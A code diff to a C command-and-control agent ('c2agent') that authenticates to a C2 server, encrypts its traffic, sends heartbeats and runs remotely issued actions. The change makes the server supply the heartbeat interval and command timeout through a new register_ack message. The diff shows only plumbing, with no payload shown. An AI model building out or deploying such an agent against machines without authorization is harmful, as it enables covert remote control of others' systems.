@@ -10,8 +10,6 @@ typedef struct {
     int   c2_port;
     char *agent_id;
     char *auth_token;
-    int   heartbeat_interval;
-    int   cmd_timeout;
     int   reconnect_initial;
     int   reconnect_max;
 } opts;
@@ -19,10 +17,31 @@ typedef struct {
 static void opts_init(opts *o) {
     memset(o, 0, sizeof *o);
     o->config_path = xstrdup("config.json");
-    o->heartbeat_interval = 30;
-    o->cmd_timeout = 60;
     o->reconnect_initial = 1;
     o->reconnect_max = 60;
+}
+
+/* ---------- runtime timing (populated by register_ack) ---------- */
+void runtime_config_init(runtime_config_t *rc) {
+    c2a_mutex_init(&rc->mu);
+    rc->heartbeat_interval = 30;
+    rc->cmd_timeout = 60;
+}
+
+void runtime_config_set(runtime_config_t *rc, int heartbeat_interval, int cmd_timeout) {
+    if (heartbeat_interval > MAX_RUNTIME_TIMING_SEC) heartbeat_interval = MAX_RUNTIME_TIMING_SEC;
+    if (cmd_timeout > MAX_RUNTIME_TIMING_SEC) cmd_timeout = MAX_RUNTIME_TIMING_SEC;
+    c2a_mutex_lock(&rc->mu);
+    if (heartbeat_interval > 0) rc->heartbeat_interval = heartbeat_interval;
+    if (cmd_timeout > 0) rc->cmd_timeout = cmd_timeout;
+    c2a_mutex_unlock(&rc->mu);
+}
+
+void runtime_config_get(runtime_config_t *rc, int *heartbeat_interval, int *cmd_timeout) {
+    c2a_mutex_lock(&rc->mu);
+    if (heartbeat_interval) *heartbeat_interval = rc->heartbeat_interval;
+    if (cmd_timeout) *cmd_timeout = rc->cmd_timeout;
+    c2a_mutex_unlock(&rc->mu);
 }
 
 /* ===================================================================== */
@@ -115,8 +134,6 @@ static void load_config_file(const char *path, opts *o, int quiet) {
         free(o->auth_token);
         o->auth_token = xstrdup(v);
     }
-    o->heartbeat_interval = json_find_int(buf, "heartbeat_interval_sec", o->heartbeat_interval);
-    o->cmd_timeout = json_find_int(buf, "cmd_timeout", o->cmd_timeout);
     o->reconnect_initial = json_find_int(buf, "reconnect_initial_sec", o->reconnect_initial);
     o->reconnect_max = json_find_int(buf, "reconnect_max_sec", o->reconnect_max);
     free(buf);
@@ -132,8 +149,6 @@ static void print_usage(const char *prog) {
     printf("  --c2-address host:port      C2 address (required unless in config)\n");
     printf("  --agent-id <id>            unique agent id (required unless in config)\n");
     printf("  --auth-token <token>       pre-shared token (required unless in config)\n");
-    printf("  --heartbeat-interval <sec> heartbeat interval (default 30)\n");
-    printf("  --cmd-timeout <sec>        command execution timeout (default 60)\n");
     printf("  --reconnect-initial <sec>  initial reconnect delay (default 1)\n");
     printf("  --reconnect-max <sec>      max reconnect delay (default 60)\n");
 }
@@ -172,10 +187,6 @@ static int parse_args(int argc, char **argv, opts *o) {
         } else if (!strcmp(name, "auth-token")) {
             free(o->auth_token);
             o->auth_token = xstrdup(val);
-        } else if (!strcmp(name, "heartbeat-interval")) {
-            o->heartbeat_interval = atoi(val);
-        } else if (!strcmp(name, "cmd-timeout")) {
-            o->cmd_timeout = atoi(val);
         } else if (!strcmp(name, "reconnect-initial")) {
             o->reconnect_initial = atoi(val);
         } else if (!strcmp(name, "reconnect-max")) {
@@ -268,6 +279,49 @@ static void gen_nonce(char *out, size_t outsz) {
     out[outsz - 1] = 0;
 }
 
+/* Parse register_ack([heartbeat_interval_sec, cmd_timeout]) and apply it to
+ * the runtime configuration. Returns 0 on success. */
+static int apply_register_ack(const uint8_t *body, uint32_t blen, runtime_config_t *rc) {
+    char **params = NULL;
+    int n = 0;
+    if (tlv_decode(body, blen, &params, &n) != 0 || n < 2) {
+        tlv_free(params, n);
+        return -1;
+    }
+    int hb = atoi(params[0]);
+    int ct = atoi(params[1]);
+    tlv_free(params, n);
+    if (hb <= 0 || hb > MAX_RUNTIME_TIMING_SEC ||
+        ct <= 0 || ct > MAX_RUNTIME_TIMING_SEC) {
+        return -1;
+    }
+    runtime_config_set(rc, hb, ct);
+    return 0;
+}
+
+/* Wait for the encrypted register_ack that follows register_confirm. A
+ * missing/invalid ACK is a handshake failure: the agent then reconnects rather
+ * than running with stale timing values. */
+static int wait_register_ack(sockfd_t sock, bytebuf_t *inbuf, runtime_config_t *rc, int timeout_ms) {
+    uint64_t req_id;
+    uint8_t cmd;
+    const uint8_t *body;
+    uint32_t blen;
+    if (take_packet_blocking(sock, inbuf, &req_id, &cmd, &body, &blen, timeout_ms) <= 0) {
+        fprintf(stderr, "[c2agent] no register_ack from C2\n");
+        return -1;
+    }
+    if (cmd != CMD_REGISTER_ACK) {
+        fprintf(stderr, "[c2agent] expected register_ack, got cmd=%#x\n", cmd);
+        return -1;
+    }
+    if (apply_register_ack(body, blen, rc) != 0) {
+        fprintf(stderr, "[c2agent] invalid register_ack payload\n");
+        return -1;
+    }
+    return 0;
+}
+
 /* Challenge-response registration handshake.
  * 1. Send register carrying ONLY a random nonce (no agent id / hostname / os
  *    yet, so identity is not leaked before authentication).
@@ -275,8 +329,10 @@ static void gen_nonce(char *out, size_t outsz) {
  * 3. Verify the hash locally; on mismatch return -1 (disconnect).
  * 4. On success switch to ChaCha20 and send register_confirm now carrying the
  *    identity fields (agent_id, hostname, os); the confirm is ENCRYPTED (the
- *    first packet of the Agent -> C2 stream). Returns 0 on success, -1. */
-static int auth_handshake(sockfd_t sock, const opts *o, bytebuf_t *inbuf) {
+ *    first packet of the Agent -> C2 stream).
+ * 5. Wait for the encrypted register_ack carrying the timing parameters the
+ *    C2 wants this agent to use. Returns 0 on success, -1 on failure. */
+static int auth_handshake(sockfd_t sock, const opts *o, bytebuf_t *inbuf, runtime_config_t *rt) {
     char nonce[40];
     gen_nonce(nonce, sizeof nonce);
 
@@ -335,7 +391,11 @@ static int auth_handshake(sockfd_t sock, const opts *o, bytebuf_t *inbuf) {
     rc = send_all(sock, pkt, plen2);
     free(pkt);
     free(os);
-    return rc;
+    if (rc != 0) return -1;
+
+    /* The C2 replies with an encrypted register_ack carrying the runtime
+     * heartbeat interval and command timeout. */
+    return wait_register_ack(sock, inbuf, rt, 30000);
 }
 
 static int send_heartbeat_pkt(sockfd_t sock, uint64_t req_id) {
@@ -358,9 +418,9 @@ static int send_heartbeat_pkt(sockfd_t sock, uint64_t req_id) {
 /* ===================================================================== */
 
 typedef struct {
-    sockfd_t     sock;
-    int          interval; /* seconds */
-    volatile int stop;
+    sockfd_t         sock;
+    runtime_config_t *rc; /* timing supplied by register_ack */
+    volatile int     stop;
 } hb_ctx;
 
 #ifdef _WIN32
@@ -371,10 +431,14 @@ typedef struct {
 
 static HB_THREAD_RET hb_thread(void *arg) {
     hb_ctx *c = (hb_ctx *)arg;
-    uint64_t req = 3; /* 1 = register, 2 = register_confirm */
+    uint64_t req = 3; /* 1 = register, 2 = register_confirm, 3+ = heartbeat */
     while (!c->stop) {
+        int interval = 30;
+        runtime_config_get(c->rc, &interval, NULL);
+        if (interval < 1) interval = 1;
+        if (interval > MAX_RUNTIME_TIMING_SEC) interval = MAX_RUNTIME_TIMING_SEC;
         int waited = 0;
-        int total = c->interval * 1000;
+        int total = interval * 1000;
         /* Sleep in short slices so shutdown does not wait a whole interval. */
         while (waited < total && !c->stop) {
             sleep_sec(0.2);
@@ -544,7 +608,7 @@ static int is_action(uint8_t cmd) {
 }
 
 /* Returns: 0 continue, 1 shutdown, -1 disconnect/protocol-fatal. */
-static int dispatch(sockfd_t sock, bytebuf_t *inbuf, const opts *o, int *shutdown_flag,
+static int dispatch(sockfd_t sock, bytebuf_t *inbuf, runtime_config_t *rt, int *shutdown_flag,
                     uint64_t req_id, uint8_t cmd,
                     const uint8_t *body, uint32_t blen) {
     if (cmd == CMD_HEARTBEAT) {
@@ -554,6 +618,12 @@ static int dispatch(sockfd_t sock, bytebuf_t *inbuf, const opts *o, int *shutdow
     if (cmd == CMD_HEARTBEAT_ACK) return 0;
     if (cmd == CMD_REGISTER_RESPONSE) {
         fprintf(stderr, "[c2agent] register_response: %.*s\n", (int)blen, (const char *)body);
+        return 0;
+    }
+    if (cmd == CMD_REGISTER_ACK) {
+        /* A repeated ACK can refresh timing at runtime. */
+        if (apply_register_ack(body, blen, rt) != 0)
+            fprintf(stderr, "[c2agent] invalid repeated register_ack\n");
         return 0;
     }
     if (cmd == CMD_DISCONNECT) return -1;
@@ -575,7 +645,11 @@ static int dispatch(sockfd_t sock, bytebuf_t *inbuf, const opts *o, int *shutdow
             send_response_pkt(sock, req_id, cmd, "Error: bad TLV", strlen("Error: bad TLV"));
             return 0;
         }
-        char *result = run_action(cmd, params, n, o->cmd_timeout);
+        int cmd_timeout = 60;
+        runtime_config_get(rt, NULL, &cmd_timeout);
+        if (cmd_timeout < 1) cmd_timeout = 1;
+        if (cmd_timeout > MAX_RUNTIME_TIMING_SEC) cmd_timeout = MAX_RUNTIME_TIMING_SEC;
+        char *result = run_action(cmd, params, n, cmd_timeout);
         tlv_free(params, n);
         char *capped = cap_output(result);
         free(result);
@@ -591,7 +665,7 @@ static int dispatch(sockfd_t sock, bytebuf_t *inbuf, const opts *o, int *shutdow
 /* serve loop + reconnect                                                */
 /* ===================================================================== */
 
-static int serve(sockfd_t sock, const opts *o, bytebuf_t *inbuf, int *shutdown_flag) {
+static int serve(sockfd_t sock, runtime_config_t *rt, bytebuf_t *inbuf, int *shutdown_flag) {
     int ret = 0;
     for (;;) {
         uint64_t req_id;
@@ -601,7 +675,7 @@ static int serve(sockfd_t sock, const opts *o, bytebuf_t *inbuf, int *shutdown_f
         int have = bb_take_packet(inbuf, &req_id, &cmd, &body, &blen);
         if (have < 0) { ret = -1; break; }
         if (have > 0) {
-            ret = dispatch(sock, inbuf, o, shutdown_flag, req_id, cmd, body, blen);
+            ret = dispatch(sock, inbuf, rt, shutdown_flag, req_id, cmd, body, blen);
             if (ret != 0) break;
             continue;
         }
@@ -618,6 +692,8 @@ static double next_delay(double d, double max) {
 
 static int run(const opts *o) {
     int shutdown_flag = 0;
+    runtime_config_t rt;
+    runtime_config_init(&rt);
     double delay = (double)o->reconnect_initial;
     if (delay < 1.0) delay = 1.0;
     while (!shutdown_flag) {
@@ -637,7 +713,7 @@ static int run(const opts *o) {
         crypto_disable();
         bytebuf_t inbuf;
         bb_init(&inbuf);
-        if (auth_handshake(sock, o, &inbuf) != 0) {
+        if (auth_handshake(sock, o, &inbuf, &rt) != 0) {
             bb_free(&inbuf);
             sock_close(sock);
             fprintf(stderr, "[c2agent] registration handshake failed; retry in %.0fs\n", delay);
@@ -652,7 +728,7 @@ static int run(const opts *o) {
         /* Heartbeats run on their own thread; the stream is encrypted now. */
         hb_ctx hb;
         hb.sock = sock;
-        hb.interval = o->heartbeat_interval;
+        hb.rc = &rt;
         hb.stop = 0;
 #ifdef _WIN32
         HANDLE hb_handle = CreateThread(NULL, 0, hb_thread, &hb, 0, NULL);
@@ -661,7 +737,7 @@ static int run(const opts *o) {
         pthread_create(&hb_handle, NULL, hb_thread, &hb);
 #endif
 
-        int ret = serve(sock, o, &inbuf, &shutdown_flag);
+        int ret = serve(sock, &rt, &inbuf, &shutdown_flag);
 
         hb.stop = 1;
 #ifdef _WIN32
@@ -750,11 +826,8 @@ int main(int argc, char **argv) {
         fprintf(stderr, "[c2agent] provide via --c2-address / --agent-id / --auth-token or a config file\n");
         return 1;
     }
-    if (o.heartbeat_interval < 1) o.heartbeat_interval = 1;
-    if (o.cmd_timeout < 1) o.cmd_timeout = 1;
-
-    fprintf(stderr, "[c2agent] agent '%s' starting; C2=%s:%d (heartbeat=%ds, cmd_timeout=%ds)\n",
-            o.agent_id, o.c2_host, o.c2_port, o.heartbeat_interval, o.cmd_timeout);
+    fprintf(stderr, "[c2agent] agent '%s' starting; C2=%s:%d (timing supplied by C2 register_ack)\n",
+            o.agent_id, o.c2_host, o.c2_port);
     int r = run(&o);
 
     free(o.c2_host);
